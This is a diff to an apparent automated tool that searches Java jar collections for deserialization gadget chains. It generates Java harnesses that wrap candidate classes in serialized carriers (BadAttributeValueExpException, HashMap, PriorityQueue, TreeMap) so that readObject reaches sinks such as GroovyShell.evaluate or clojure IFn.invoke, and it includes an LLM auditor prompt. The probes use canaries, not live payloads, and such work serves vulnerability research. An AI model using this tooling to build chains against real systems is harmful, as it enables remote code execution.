@@ -1,9 +1,9 @@
-"""JGDChainCompleteAgent — 停止条件二选一: 完整链 或 穷尽证明 (R9)。
+"""JGDChainCompleteAgent — 停止条件二选一: 完整链 或 穷尽证明 。
 
 用户裁决的停止条件: 挖到完整链, 或在定义的搜索范围内彻底证明没有链。
 两者之前 agent 不停; 状态持久化可断点续跑。
 
-图数据源规则 (用户裁决 R10): 图必须根据项目实时构造;
+图数据源规则 (用户裁决 ): 图必须根据项目实时构造;
 仅当已有图带语料指纹且与当前语料匹配(已跑过的系统)才允许复用。
 ensure_graph() 实现该规则: 指纹不符/缺失 → 从当前语料实时重建。
 
@@ -73,9 +73,61 @@ public class CB{n} {{
             java.nio.file.Paths.get(System.getProperty("jgd.mark"))); }}
         catch (Exception e) {{ return false; }} }}
 
+    static boolean hasCreateMap(Class<?> ft) {{
+        return createMapFor(ft, new java.util.HashMap<>()) != null;
+    }}
+    // Map 中介分派的接口代理 handler — 必须可序列化(lambda 不可, 载体
+    // 序列化阶段即 NotSerializable)
+    static class MapTail implements java.lang.reflect.InvocationHandler,
+            java.io.Serializable {{
+        private final Object rv;
+        MapTail(Object recv) {{ rv = recv; }}
+        public Object invoke(Object p, java.lang.reflect.Method m,
+                Object[] a) throws Throwable {{
+            try {{
+                return rv.getClass().getMethod(m.getName(),
+                    m.getParameterTypes()).invoke(rv, a);
+            }} catch (Throwable t) {{
+                System.out.println("R MAPDISPATCH " + m.getName());
+                return rv.toString();
+            }}
+        }}
+    }}
+    static Object createMapFor(Class<?> ft, java.util.Map<?, ?> mm) {{
+        // Map 型转发字段的构造: 本类型或其 clojure 实现类上的静态 create(Map)
+        // (IPersistentMap 接口自身无 create, 在 PersistentArrayMap 上)
+        if (java.util.Map.class.isAssignableFrom(ft))
+            return new java.util.HashMap<>(mm);
+        Class<?>[] cands;
+        try {{
+            cands = new Class<?>[]{{ ft,
+                Class.forName("clojure.lang.PersistentArrayMap"),
+                Class.forName("clojure.lang.PersistentHashMap")}};
+        }} catch (Throwable t) {{ cands = new Class<?>[]{{ ft }}; }}
+        for (Class<?> c : cands) {{
+            try {{
+                java.lang.reflect.Method m = c.getMethod("create",
+                    java.util.Map.class);
+                if (Modifier.isStatic(m.getModifiers())
+                        && ft.isAssignableFrom(c)) {{
+                    return m.invoke(null, mm);
+                }}
+            }} catch (Throwable ig) {{}}
+        }}
+        return null;
+    }}
     public static void main(String[] args) {{
         String carrier = System.getProperty("jgd.carrier", "BAVE");
         String fwd = "-".equals(args[1]) ? null : args[1];
+        // Map 中介分派桥: fwd 形如 field|key|iface — 转发字段是 Map 类型,
+        // 接收者经 map.put(key, 接口代理) 流入(对齐 PoC 层装配语义)
+        String fwdKey = null, fwdIface = null;
+        if (fwd != null && fwd.indexOf('|') >= 0) {{
+            String[] fp = fwd.split("\\\\|", -1);
+            fwd = fp[0];
+            if (fp.length > 1) fwdKey = fp[1];
+            if (fp.length > 2) fwdIface = fp[2];
+        }}
         try {{
             Class<?> bc = Class.forName(args[0]);
             for (int ai = 2; ai < args.length; ai++) {{
@@ -102,7 +154,30 @@ public class CB{n} {{
                             Modifier.isTransient(f.getModifiers())) continue;
                         Class<?> ft = f.getType();
                         Object v;
-                        if (fwd != null && f.getName().equals(fwd)
+                        if (fwdKey != null && fwd != null
+                                && f.getName().equals(fwd)
+                                && (java.util.Map.class.isAssignableFrom(ft)
+                                    || hasCreateMap(ft))) {{
+                            java.util.HashMap<Object, Object> mm =
+                                new java.util.HashMap<>();
+                            Object pv = recv;
+                            if (fwdIface != null && !fwdIface.isEmpty()) {{
+                                Class<?> ic = Class.forName(fwdIface);
+                                pv = java.lang.reflect.Proxy.newProxyInstance(
+                                    ic.getClassLoader(), new Class[]{{ ic }},
+                                    new MapTail(recv));
+                            }}
+                            // 多触发键: 载体决定哪个键被查, 全部注入
+                            for (String fk : fwdKey.split(",")) {{
+                                if (!fk.isEmpty()) mm.put(fk, pv);
+                            }}
+                            if (java.util.Map.class.isAssignableFrom(ft)) {{
+                                v = mm;
+                            }} else {{
+                                v = createMapFor(ft, mm);
+                                if (v == null) {{ continue; }}
+                            }}
+                        }} else if (fwd != null && f.getName().equals(fwd)
                             && (ft == Object.class || ft.isInstance(recv)
                                 || (ft.isInterface() && ft.isAssignableFrom(rc)))) {{
                             v = recv;
@@ -118,7 +193,7 @@ public class CB{n} {{
                     if (inj1 == 0) {{ System.out.println("R NOFIT"); continue; }}
                     Object b;
                     if (carrier.startsWith("HASHMAP")) {{
-                        // R47(载体盲区): HASHMAP_EQ 双实例同尾同哈希 —
+                        // (载体盲区): HASHMAP_EQ 双实例同尾同哈希 —
                         // readObject 重哈希触发 equals 分派(覆盖 equals 桥)
                         java.util.HashMap<Object,Object> m =
                             new java.util.HashMap<>();
@@ -140,7 +215,7 @@ public class CB{n} {{
                         }}
                         b = m;
                     }} else if (carrier.startsWith("PRIORITY_QUEUE")) {{
-                        // R53(致命盲区修复): PriorityQueue 载体 — readObject
+                        // (致命盲区修复): PriorityQueue 载体 — readObject
                         // heapify 触发 compare()/compareTo()。覆盖 CC2/CB1 型链族。
                         java.util.PriorityQueue<Object> pq;
                         if (bridge instanceof java.util.Comparator) {{
@@ -157,7 +232,7 @@ public class CB{n} {{
                         }}
                         b = pq;
                     }} else if (carrier.startsWith("TREEMAP")) {{
-                        // R53: TreeMap 载体 — readObject put 触发 compare/compareTo
+                        // TreeMap 载体 — readObject put 触发 compare/compareTo
                         java.util.TreeMap<Object, Object> tm;
                         if (bridge instanceof java.util.Comparator) {{
                             tm = new java.util.TreeMap<>(
@@ -233,13 +308,13 @@ public class CB{n} {{
         if (s.contains("JGDCANARY")) System.out.println("R CANARY");
     }}
     static final Object SKIP = new Object();
-    // R31 字段契约合成: 除转发字段外全字段注"存活值" — 具体类裸实例/空数组
+    //  字段契约合成: 除转发字段外全字段注"存活值" — 具体类裸实例/空数组
     // 是新能力, 修复空状态 NPE (carrier_fail 90% 的根因)
     static Object survival(Class<?> ft, Object recv) {{
         try {{
             if (ft == Object.class) return recv != null ? recv : new MV{n}();
             if (ft == String.class) return "JGDCANARY{n}";
-            // R47(sink参数盲区): 类型化 canary — URL/URI 字段带可观测协议串,
+            // (sink参数盲区): 类型化 canary — URL/URI 字段带可观测协议串,
             // 异常消息回显即值流证据
             if (ft == java.net.URL.class)
                 return new java.net.URL("http://jgdcanary.invalid/p{n}");
@@ -288,19 +363,13 @@ LIVE_DB = Path.home() / "jgd/jgd_graph_live.db"
 
 
 def corpus_fingerprint() -> str:
-    import hashlib
-    h = hashlib.sha256()
-    for jar in sorted(ma.corpus_dir().glob("*.jar")):
-        st = jar.stat()
-        h.update(jar.name.encode())
-        h.update(str(st.st_size).encode())
-    return h.hexdigest()[:16]
+    return ma.corpus_fingerprint()
 
 
 def _sink_inventory() -> list[tuple[str, str]]:
     """SINK 种子集: 已跑系统清单 + sink_points_live 六类 + 经典 RCE/JNDI/字节码族。
 
-    R12: 仅 14 条 groovy 定义时反向可达近空(pairs=0 的假穷尽) — 扩展种子面。
+    仅 14 条 groovy 定义时反向可达近空(pairs=0 的假穷尽) — 扩展种子面。
     """
     inv: list[tuple[str, str]] = []
     try:
@@ -339,13 +408,16 @@ def _sink_inventory() -> list[tuple[str, str]]:
         ("groovy.lang.GroovyShell", "evaluate"),
         ("groovy.lang.GroovyShell", "parse"),
         ("groovy.lang.GroovyClassLoader", "parseClass"),
+        # clojure 式函数接口 sink: IFn.invoke 携带攻击者求值体
+        ("clojure.lang.IFn", "invoke"),
+        ("clojure.lang.Var", "invoke"),
     ]
     seen: set[tuple[str, str]] = set()
     return [x for x in inv if not (x in seen or seen.add(x))]
 
 
 def add_dispatch_edges(gdb: Path, fp: str) -> int:
-    """R16 CHA 分派边: (接口, m) → (实现类, m)。
+    """ CHA 分派边: (接口, m) → (实现类, m)。
 
     无分派边的调用图在接口分派边界系统性断裂 —— 桥调 x.transform() 只连到
     (Transformer, transform) 接口节点, 而真正的 sink 路径在实现类节点上。
@@ -404,7 +476,7 @@ def add_dispatch_edges(gdb: Path, fp: str) -> int:
                         node_ids[key] = row[0]
                         edges.append((iid, row[0]))
     conn.executemany("INSERT OR IGNORE INTO edges VALUES (?,?)", edges)
-    # R47(反射可见性盲区): 反射 API 节点(Class.forName/Method.invoke/lookup)
+    # (反射可见性盲区): 反射 API 节点(Class.forName/Method.invoke/lookup)
     # 交给 retag_sinks 作种子 — 其调用者自动成为 dist-1 接收者
     conn.execute("INSERT OR REPLACE INTO meta VALUES ('dispatch_edges', ?)",
                  (f"{fp}:v2",))
@@ -415,7 +487,7 @@ def add_dispatch_edges(gdb: Path, fp: str) -> int:
 
 
 def retag_sinks(gdb: Path, sink_keys: set[tuple[str, str]]) -> int:
-    """R12: sink 种子扩展后重打角色(边不动); 返回命中 sink 方法数。"""
+    """sink 种子扩展后重打角色(边不动); 返回命中 sink 方法数。"""
     conn = sqlite3.connect(str(gdb))
     conn.execute("UPDATE nodes SET role='METHOD' WHERE role='SINK'")
     n = 0
@@ -434,7 +506,7 @@ def retag_sinks(gdb: Path, sink_keys: set[tuple[str, str]]) -> int:
 
 
 def discover_product_sinks() -> list[tuple[str, str]]:
-    """R40: 产品自有 sink 发现 — 目标语料内直接调用危险原语名的方法
+    """产品自有 sink 发现 — 目标语料内直接调用危险原语名的方法
     (产品私有脚本引擎/命令分发器等) 加入 sink 种子。图边已含全部调用关系,
     这里只做一次 SQL 筛选。"""
     danger = ("exec", "eval", "loadClass", "defineClass", "lookup",
@@ -464,7 +536,7 @@ def discover_product_sinks() -> list[tuple[str, str]]:
 
 
 def ensure_graph(verbose: bool = True) -> Path:
-    """R10: 图实时构造规则。指纹匹配的已跑图才复用, 否则从当前语料重建。"""
+    """图实时构造规则。指纹匹配的已跑图才复用, 否则从当前语料重建。"""
     fp = corpus_fingerprint()
     if LIVE_DB.exists():
         conn = sqlite3.connect(str(LIVE_DB))
@@ -566,7 +638,7 @@ def _has_table(conn, name: str) -> bool:
 
 class JGDChainCompleteAgent:
     def __init__(self):
-        # R49(语料分域): 状态文件按语料指纹隔离 — 换语料自动归档旧状态,
+        # (语料分域): 状态文件按语料指纹隔离 — 换语料自动归档旧状态,
         # 防止旧语料的 tried_pairs/桥池污染新语料 (apache2026 实验暴露)
         fp = corpus_fingerprint()
         if STATE.exists():
@@ -574,7 +646,7 @@ class JGDChainCompleteAgent:
             if old.get("corpus_fp") not in (None, fp):
                 STATE.rename(STATE.with_name(
                     f"jgd_chain_state.{old['corpus_fp'][:8]}.json"))
-                print(f"[r49] 语料变更: 旧状态归档 -> {old['corpus_fp'][:8]}")
+                print(f"[语料分域] 语料变更: 旧状态归档 -> {old['corpus_fp'][:8]}")
         self.db = chroma_store.VStore()
         self.state = (json.loads(STATE.read_text(encoding="utf-8"))
                       if STATE.exists() else
@@ -589,7 +661,7 @@ class JGDChainCompleteAgent:
     # ---------------- 1. bridges ----------------
 
     def load_bridges(self) -> list[dict]:
-        """R12: 桥池 = 链审计 CONFIRM ∪ evolve TRIGGERED(链PoC已证) ∪ verify 存活者。
+        """桥池 = 链审计 CONFIRM ∪ evolve TRIGGERED(链PoC已证) ∪ verify 存活者。
         ds 审计非确定性不允许踢掉链 PoC 已证实的桥。"""
         cand: dict[str, dict] = {}
         ca = scope.scoped(HERE / "jgd_chain_audit.json")
@@ -607,7 +679,7 @@ class JGDChainCompleteAgent:
                                       "why": "链PoC TRIGGERED"}
         for g in self._verify_survivors():
             cand.setdefault(g, {"cls": g, "prio": 2, "why": "verify survivor"})
-        # R20(ds反思: 入口命中率): 57 个 INTERESTING 里每轮只审 12-15,
+        # (ds反思: 入口命中率): 57 个 INTERESTING 里每轮只审 12-15,
         # 未审计的 40+ 个桥从未参与配对 —— 潜在链最大的未挖面, prio 3 放开
         vs = scope.DATA / "verify_state.json"
         if vs.exists():
@@ -616,7 +688,7 @@ class JGDChainCompleteAgent:
                     cand.setdefault(g["cls"],
                                     {"cls": g["cls"], "prio": 3,
                                      "why": "verify INTERESTING 未审计"})
-            # R47(深度盲区): 链延伸递归 — DEPTH2 接收者为桥(深度3),
+            # (深度盲区): 链延伸递归 — DEPTH2 接收者为桥(深度3),
             # 其 evidence 再延伸一层(深度4)
             ext_receivers = {e.get("receiver", "").replace("/", ".")
                              for e in self.state.get("evidence", [])
@@ -636,7 +708,7 @@ class JGDChainCompleteAgent:
             evd = self._static_evidence(b["cls"])
             if not evd or not evd.get("bridge_detail"):
                 continue
-            # R13: 接收者桥的 dispatch=目标方法名; 参数桥的 dispatch=触发器名
+            # 接收者桥的 dispatch=目标方法名; 参数桥的 dispatch=触发器名
             # (静态助手内部对 arg 分派 equals/hashCode/toString, 取保守并集)
             disp: set[str] = set()
             for t in evd["bridge_detail"]:
@@ -672,7 +744,7 @@ class JGDChainCompleteAgent:
     def scan_receivers(self, dispatch: list[str], cap: int = 60) -> list[dict]:
         """距 SINK ≤3 跳(含 CHA 分派边) + 触发方法 ∈ dispatch + 具体可序列化。
 
-        R25: 池按 dispatch 集合缓存 —— 381 桥的 dispatch 大量重复
+        池按 dispatch 集合缓存 —— 381 桥的 dispatch 大量重复
         (绝大多数={equals,hashCode,toString}), 每轮重复图BFS+jar验证是瓶颈。
         """
         cache_f = scope.DATA / "receiver_pool_cache.json"
@@ -727,8 +799,10 @@ class JGDChainCompleteAgent:
                 if not row:
                     continue
                 owner, mname = row["owner"], row["mname"]
-            if mname not in dispatch or "$" in (owner or "") or not owner:
+            if mname not in dispatch or not owner:
                 continue
+            # 接收者池不排除 $-内部类(桥发现层才排除匿名类);
+            # $-类如 EqualsBean$foo 可能是关键中介
             recs.append({"cls": owner, "method": mname, "dist": dist})
         conn.close()
         recs = list({x["cls"]: x for x in recs}.values())
@@ -747,9 +821,18 @@ class JGDChainCompleteAgent:
                 p = own.replace(".", "/") + ".class"
                 if own not in jar_of and p in names:
                     jar_of[own] = jar.name
+        # JDK 内置类不在语料 jar 中但可作接收者/中介 — 按 JDK 内部前缀放行
+        JDK_PREFIXES = ("java.", "javax.", "jdk.", "sun.", "com.sun.")
+        for r in recs:
+            if r["cls"].startswith(JDK_PREFIXES) and r["cls"] not in jar_of:
+                jar_of[r["cls"]] = "JDK_BUILTIN"
         for r in recs:
             jar = jar_of.get(r["cls"])
             if not jar:
+                continue
+            if jar == "JDK_BUILTIN":
+                verified.append({**r, "jar": "JDK_BUILTIN",
+                                 "serializable": True})
                 continue
             try:
                 with zipfile.ZipFile(ma.corpus_dir() / jar) as z:
@@ -779,9 +862,9 @@ class JGDChainCompleteAgent:
 
     @staticmethod
     def _carrier_java(kind: str, n: int) -> str:
-        """R23(ds: 入口命中率): BAVE 只触发 toString —— hashCode/equals 桥
+        """(ds: 入口命中率): BAVE 只触发 toString —— hashCode/equals 桥
         在 BAVE 下永远不触发。HashMap 载体触发 hashCode(readObject 重哈希);
-        put 时的早期触发由 R18 写侧清除吸收, 只剩读侧。"""
+        put 时的早期触发由 写侧清除吸收, 只剩读侧。"""
         if kind == "BAVE":
             return (
                 "javax.management.BadAttributeValueExpException b =\n"
@@ -807,7 +890,7 @@ class JGDChainCompleteAgent:
         return cls._NL
 
     def _receiver_hooks_nl(self, receiver_cls: str) -> dict:
-        """R50(F5): 用一次构建的名单缓存查 hooks — 消除 O(jars×receivers)。"""
+        """(F5): 用一次构建的名单缓存查 hooks — 消除 O(jars×receivers)。"""
         p = receiver_cls.replace(".", "/") + ".class"
         for jar, names in self._namelists().items():
             if p not in names:
@@ -827,7 +910,7 @@ class JGDChainCompleteAgent:
         return {}
 
     def _receiver_hooks(self, receiver_cls: str) -> dict:
-        """R19(ds反思#1): 接收者的自定义序列化钩子 —— readObject 自赋值
+        """(ds反思#1): 接收者的自定义序列化钩子 —— readObject 自赋值
         会让 hop2 标记在『非桥分派』路径上触发(可达性论证的假阳性源)。"""
         try:
             for jar in sorted(ma.corpus_dir().glob("*.jar")):
@@ -853,7 +936,7 @@ class JGDChainCompleteAgent:
     def run_full_chain(self, bridge: dict, receiver: dict, n: int) -> dict:
         """BAVE→bridge{field=receiver}→readObject, 异常栈帧检测 hop1。
 
-        R17 观测升级: 不再只依赖标记物 4 方法 —— 反序列化异常的栈帧里
+  观测升级: 不再只依赖标记物 4 方法 —— 反序列化异常的栈帧里
         出现接收者类名 = hop1 分派发生的直接证据(任意方法名可见);
         hop2 仍由标记物(含 Proxy.invoke)承载。
         每个 pair 产出带失败分类的证据记录 (ds 阻断项#2)。
@@ -863,7 +946,7 @@ class JGDChainCompleteAgent:
                             carrier=self._carrier_java("BAVE", n))
         (DYN / f"CC{n}.java").write_text(src, encoding="utf-8")
         (DYN / f"MV{n}.java").write_text(MARKER2.format(n=n), encoding="utf-8")
-        # R28: 单对复跑与批次同规则选 JDK/载体 — ObjLongPair 事故: 批次在
+        # 单对复跑与批次同规则选 JDK/载体 — ObjLongPair 事故: 批次在
         # JDK17 触发, 复跑锁 JDK11 变 carrier_fail 把真实触发覆盖了
         needs = bridge.get("evidence", {}).get("needs_jdk", 11)
         jdks = ma.find_jdks()
@@ -872,7 +955,7 @@ class JGDChainCompleteAgent:
             base, jbin = ("BAVE", "HASHMAP"), jdk11_java()
         else:
             base, jbin = ("HASHMAP",), str(Path(jdk17) / "bin" / "java")
-        # R53: compare/compareTo 桥补 PriorityQueue
+        # compare/compareTo 桥补 PriorityQueue
         trig_set = {t.get("trigger", "") for t in
                     bridge.get("evidence", {}).get("bridge_detail", [])}
         if "compareTo" in trig_set or "compare" in trig_set:
@@ -935,13 +1018,13 @@ class JGDChainCompleteAgent:
         if sink_fire:
             v, tax = "CHAIN_SINK", "sink_signature"
         elif hop2:
-            # R18 修正: 标记物在对象图上唯一可达路径是 BAVE→桥→接收者→字段,
+            #  修正: 标记物在对象图上唯一可达路径是 BAVE→桥→接收者→字段,
             # 触发即证明两跳全通 —— 无异常≠无链(链走通时恰好没有栈帧)。
-            # hop1 栈帧是佐证不是必要条件 (R17 把证据当门槛是回归)。
+            # hop1 栈帧是佐证不是必要条件 ( 把证据当门槛是回归)。
             v = "CHAIN_DEPTH2"
             tax = "hop2_reach" + ("+hop1_stack" if hop1 else "")
         elif "JGDCANARY" in out:
-            # R21: 攻击者控制的 String 流入了接收者的使用点(异常消息回显)
+            # 攻击者控制的 String 流入了接收者的使用点(异常消息回显)
             # —— 参数流真实发生, sink 只差语义匹配
             v, tax = "VALUE_FLOW", "canary_echo" + ("+hop1" if hop1 else "")
         elif hop1:
@@ -958,7 +1041,7 @@ class JGDChainCompleteAgent:
             v, tax = "NOT_FIRED", "deser_ex_no_receiver_frame"
         else:
             v, tax = "NOT_FIRED", "unknown"
-        # R19: 标记 hop2 是否伴随接收者自定义钩子(假阳性风险标注)
+        # 标记 hop2 是否伴随接收者自定义钩子(假阳性风险标注)
         hooks = self._receiver_hooks(recv_dot)
         if hop2 and (hooks.get("readObject") or hooks.get("readExternal")):
             tax += "+recv_custom_readobject(ds假阳性风险)"
@@ -975,7 +1058,7 @@ class JGDChainCompleteAgent:
             "你是反序列化链对抗审计员。挖掘 agent 报告了一个全链路触发结果, 请审计定级。\n"
             "判定要求: CHAIN_SINK=有sink执行证据; CHAIN_DEPTH2=两级攻击者可控分派;\n"
             "是否构成 T2(已知范式新载体)/T3(变体); 与公开链语料(ysoserial等)对比新颖性。\n"
-            "观测语义说明(R50): dispatch_stack 中的 MV*/jdk.proxy* 帧是观测标记物\n"
+            "观测语义说明( ): dispatch_stack 中的 MV*/jdk.proxy* 帧是观测标记物\n"
             "(注入的攻击者对象替身), 其上方的中间帧(桥/接收者类)是真实链证据;\n"
             "receiver_hooks 标示接收者自定义序列化钩子(自赋值假阳性源)。\n"
             "输出 JSON: {\"verdict\":\"CONFIRM|REJECT|DOWNGRADE\",\"tier\":\"T1|T2|T3|none\","
@@ -1005,7 +1088,7 @@ class JGDChainCompleteAgent:
     BATCH_N = 910001
 
     def _compile_batch_harness(self) -> bool:
-        """R24: harness 只编译一次, 全部 (桥×接收者×载体) 复用 (算法提速核心)。"""
+        """harness 只编译一次, 全部 (桥×接收者×载体) 复用 (算法提速核心)。"""
         n = self.BATCH_N
         (DYN / f"CB{n}.java").write_text(
             CB_BATCH.format(n=n), encoding="utf-8")
@@ -1025,9 +1108,9 @@ class JGDChainCompleteAgent:
                    fwd_field: str = "-") -> list[dict]:
         """一个 JVM 跑完一个桥的全部接收者; 返回逐接收者信号。
 
-        R26: 最小 classpath —— 通配符 classpath 让 JVM 启动时展开 828 jar
+        最小 classpath —— 通配符 classpath 让 JVM 启动时展开 828 jar
         (~30s/次), 只挂本批实际用到的 jar。
-        R27: 按桥选 JDK —— 全语料桥含 Java17 类(Artemis 等), 锁 JDK11 会
+        按桥选 JDK —— 全语料桥含 Java17 类(Artemis 等), 锁 JDK11 会
         整批 UnsupportedClassVersionError。
         """
         mark = f"/tmp/jgdcb_{tag}_hop2"
@@ -1037,7 +1120,7 @@ class JGDChainCompleteAgent:
         recv_dots = [c.replace("/", ".") for c in receivers]
         cp = CP if not jars else (
             f"{DYN}:" + ":".join(str(ma.corpus_dir() / j) for j in jars))
-        # R47(观测盲区): -Xlog:class+load — 标记物不响也能证明类被加载/初始化
+        # (观测盲区): -Xlog:class+load — 标记物不响也能证明类被加载/初始化
         cmd = [java_bin or jdk11_java(), *JAVA_OPTS, f"-Djgd.mark={mark}",
                f"-Djgd.carrier={carrier}",
                f"-Xlog:class+load=info:file={clog}",
@@ -1050,7 +1133,7 @@ class JGDChainCompleteAgent:
                       for ln in clog and Path(clog).read_text(
                           encoding="utf-8", errors="replace").splitlines()
                       if " Loaded " in ln or ln.startswith("[class,load]")}
-        # R30: 最小CP可能丢桥的传递依赖(父类/接口在别的jar) — NCDFE 回退全量CP重试
+        # 最小CP可能丢桥的传递依赖(父类/接口在别的jar) — NCDFE 回退全量CP重试
         if "NoClassDefFound" in out or "ClassNotFoundException" in out.split("R FATAL")[-1][:200]:
             cmd2 = [java_bin or jdk11_java(), *JAVA_OPTS, f"-Djgd.mark={mark}",
                     f"-Djgd.carrier={carrier}", "-cp", CP, f"CB{self.BATCH_N}",
@@ -1082,6 +1165,8 @@ class JGDChainCompleteAgent:
                 (x[3:].split(" ")[0] for x in ls if x.startswith("EX ")
                  and "." in x[:3]), "?")
             r["hop2"] = any("hop2=true" in x for x in ls)
+            # Map 中介分派: 接收者经 map 键被路由到接口代理(有 MAPDISPATCH 打印)
+            r["mapdispatch"] = any(x.startswith("MAPDISPATCH") for x in ls)
             r["dispatch_stack"] = [x[7:] for x in ls if x.startswith("DSTACK ")][:14]
             r["hop1"] = any(x == "RECVFRAME" for x in ls)
             r["canary"] = any(x == "CANARY" for x in ls)
@@ -1099,6 +1184,8 @@ class JGDChainCompleteAgent:
             return "CHAIN_SINK", "sink_signature"
         if r["hop2"]:
             return "CHAIN_DEPTH2", "hop2_reach"
+        if r.get("mapdispatch"):
+            return "CHAIN_DEPTH2", "map_dispatch_reach"
         if r["canary"]:
             return "VALUE_FLOW", "canary_echo"
         if r["hop1"]:
@@ -1115,18 +1202,18 @@ class JGDChainCompleteAgent:
         print("=" * 64)
         print("JGDChainCompleteAgent: 完整链或穷尽证明, 不达不停")
         print("=" * 64)
-        # R14: 新运行覆盖旧判定 — 残留 verdict 会让 pair 循环首桥后误 break
-        # (R3/R4 的零尝试事故根因: 上一轮 NO_CHAIN 滞留在 state 里)
+        # 新运行覆盖旧判定 — 残留 verdict 会让 pair 循环首桥后误 break
+        # ( 的零尝试事故根因: 上一轮 NO_CHAIN 滞留在 state 里)
         self.state["verdict"] = None
-        # R14 污染量化处置: 历史 tried_pairs 在缺陷时期产生(计数/覆盖失真),
+        #  污染量化处置: 历史 tried_pairs 在缺陷时期产生(计数/覆盖失真),
         # 全量归档并清零重跑 —— 覆盖数字只在修复后的 harness 下有效
-        if self.state.get("tried_pairs") and not self.state.get("r14_archive_done"):
-            self.state["tried_pairs_r14_archive"] = list(
+        if self.state.get("tried_pairs") and not self.state.get("contamination_archived"):
+            self.state["tried_pairs_contamination_archive"] = list(
                 self.state.get("tried_pairs", []))
             self.state["tried_pairs"] = []
-            self.state["r14_archive_done"] = True
-            print(f"[r14] 归档污染期 tried_pairs "
-                  f"{len(self.state['tried_pairs_r14_archive'])} 条, 清零重跑")
+            self.state["contamination_archived"] = True
+            print(f"[污染处置] 归档污染期 tried_pairs "
+                  f"{len(self.state['tried_pairs_contamination_archive'])} 条, 清零重跑")
         tried = set(map(tuple, self.state.get("tried_pairs", [])))
         bridges = self.load_bridges()
         if not bridges:
@@ -1137,7 +1224,7 @@ class JGDChainCompleteAgent:
         pools = {}
         for b in bridges:
             pools[b["cls"]] = self.scan_receivers(b["dispatch"])
-        # R16: 空接收者池的显式穷尽陈述 (ds 阻断项: 桥池=0 不能静默)
+        # 空接收者池的显式穷尽陈述 (ds 阻断项: 桥池=0 不能静默)
         for b in bridges:
             if not pools[b["cls"]]:
                 self.state.setdefault("exhaustion_statements", []).append({
@@ -1150,11 +1237,11 @@ class JGDChainCompleteAgent:
         all_pairs = [(b["cls"], r["cls"]) for b in bridges for r in pools[b["cls"]]]
         remaining = sum(1 for p in all_pairs if list(p) not in
                         [list(t) for t in self.state.get("tried_pairs", [])])
-        # R35(ds 记账语义): 每桥显式 pool_size/pairs_tried/pairs_total,
+        # (ds 记账语义): 每桥显式 pool_size/pairs_tried/pairs_total,
         # 空池桥 0/0 + 指向显式穷尽陈述 — 消除 '42 疑似填充值' 误读
         tried_set = set(map(tuple, self.state.get("tried_pairs", [])))
         prev_pb = (self.state.get("coverage") or {}).get("per_bridge") or {}
-        per_bridge = dict(prev_pb)   # R36: 跨轮合并 — 配对累计, 账本不能每次重建
+        per_bridge = dict(prev_pb)   # 跨轮合并 — 配对累计, 账本不能每次重建
         for b in bridges:
             total_b = len(pools[b["cls"]])
             tried_b = sum(1 for r in pools[b["cls"]]
@@ -1181,7 +1268,7 @@ class JGDChainCompleteAgent:
 
         n = int(time.time()) % 900000
         attempted = 0
-        # R24: 批处理+并行 (一个JVM/桥/载体跑完全部接收者, 4 worker 并行)
+        # 批处理+并行 (一个JVM/桥/载体跑完全部接收者, 4 worker 并行)
         if not self._compile_batch_harness():
             return "BATCH_HARNESS_FAIL"
         from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -1196,9 +1283,21 @@ class JGDChainCompleteAgent:
             jars = sorted({r.get("jar") for r in fresh if r.get("jar")}
                           | {b.get("evidence", {}).get("jar")})
             needs = b.get("evidence", {}).get("needs_jdk", 11)
-            fwd = next((t["field"] for t in
-                        b.get("evidence", {}).get("bridge_detail", [])), "-")
-            # R27/R47/R53: 载体集 — 覆盖全部经典触发路径
+            bd = b.get("evidence", {}).get("bridge_detail", [])
+            mgds = [t for t in bd if t.get("via") == "mapget"]
+            if mgds:
+                # Map 中介分派桥: 注入全部触发键(载体决定哪个键被查),
+                # 接口取首个非空; fwd = field|key1,key2,...|iface
+                all_keys = ",".join(sorted({t.get("map_key") or ""
+                                            for t in mgds} - {""}))
+                iface = next((t.get("map_iface") or "").replace("/", ".")
+                             for t in mgds if t.get("map_iface"))
+                fwd = "%s|%s|%s" % (mgds[0]["field"], all_keys, iface)
+                print(f"    [fwd-mapget] {b['cls'].split('.')[-1]} -> {fwd}",
+                      flush=True)
+            else:
+                fwd = next((t["field"] for t in bd), "-")
+            # /载体集 — 覆盖全部经典触发路径
             # BAVE=toString, HashMap=hashCode, HASHMAP_EQ=equals,
             # PriorityQueue=compare/compareTo, TreeMap=compare/compareTo
             if needs <= 11 or not jdk17:
@@ -1259,14 +1358,14 @@ class JGDChainCompleteAgent:
                               f" → {r['receiver'].split('/')[-1]}", flush=True)
                     if v == "CHAIN_SINK":
                         sink_found = True
-                # R33: 每批落盘 — 251-fire 事故: 取证阶段超时使整轮成果丢失
-                # R51(D1): totals 同批增量更新 — 窗口截断不丢账本显示
+                # 每批落盘 — 251-fire 事故: 取证阶段超时使整轮成果丢失
+                # (D1): totals 同批增量更新 — 窗口截断不丢账本显示
                 self.state["coverage"].setdefault("totals", {})
                 self.state["coverage"]["totals"]["pairs_tried"] = len(tried)
                 self.state["coverage"]["totals"]["pairs_total"] = len(all_pairs)
                 self.save()
 
-        # R37(ds 收口): 批次后仍有 pairs_tried<pairs_total 的桥 — 单接收者诊断,
+        # (ds 收口): 批次后仍有 pairs_tried<pairs_total 的桥 — 单接收者诊断,
         # 依赖缺失(FATAL/NCDFE)则显式记 env_blocked(诚实降级, 不假装穷尽)
         for b in bridges:
             pool = pools[b["cls"]]
@@ -1300,9 +1399,9 @@ class JGDChainCompleteAgent:
                 print(f"  [env-blocked] {b['cls'].split('.')[-1]} "
                       f"{len(fresh_left)} 对 → 显式降级", flush=True)
 
-        # 触发对: R33 直接用批次证据(dispatch_stack 已回传)审计, 免单对复跑
-        # R50(F9): LLM 审计并行(8线程) + evidence-hash 缓存;
-        # R50(F2): 逐条异常隔离, 失败落 audit_failed.jsonl 不炸整轮(rc=0 可续跑)
+        # 触发对:  直接用批次证据(dispatch_stack 已回传)审计, 免单对复跑
+        # (F9): LLM 审计并行(8线程) + evidence-hash 缓存;
+        # (F2): 逐条异常隔离, 失败落 audit_failed.jsonl 不炸整轮(rc=0 可续跑)
         from concurrent.futures import ThreadPoolExecutor, as_completed
         cache_f = scope.DATA / "audit_cache.json"
         a_cache = (json.loads(cache_f.read_text(encoding="utf-8"))
@@ -1321,9 +1420,11 @@ class JGDChainCompleteAgent:
                     b, {"cls": recv_like["cls"],
                         "method": r.get("receiver_method", "?"),
                         "dist": r.get("dist", 0)},
-                    {"verdict": "CHAIN_DEPTH2" if r.get("hop2") else "HOP1_ONLY",
